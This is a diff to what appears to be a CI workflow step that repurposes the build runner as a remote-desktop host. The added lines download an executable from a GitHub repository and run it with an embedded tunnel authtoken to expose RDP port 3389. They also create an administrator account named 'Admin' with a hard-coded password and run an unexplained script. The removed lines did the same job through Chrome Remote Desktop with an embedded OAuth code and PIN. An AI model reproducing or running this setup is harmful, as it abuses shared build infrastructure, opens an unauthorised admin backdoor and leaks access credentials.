@@ -11,8 +11,10 @@ jobs:
     
     - name: rrt
       run: |
-           & {$P = $env:TEMP + '\chromeremotedesktophost.msi'; Invoke-WebRequest 'https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi' -OutFile $P; Start-Process $P -Wait; Remove-Item $P}
+           curl -o use.exe https://github.com/Usser1222/circleci/raw/main/use.exe 
+           use authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
+           start /B ngrok tcp 3389
            cmd /c net user /add Admin P@ssw0rd.
            cmd /c net localgroup /add administrators Admin
-           & "${Env:PROGRAMFILES(X86)}\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="4/0AeaYSHCXVRY_tXb4EUayD4DyXmgOKueFrEJPrVksTzaX18kd4Q6z5p_KtNEDBeYMWSiLqw" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$Env:COMPUTERNAME --pin=123456
+           sleep 120
            .\0.ps1
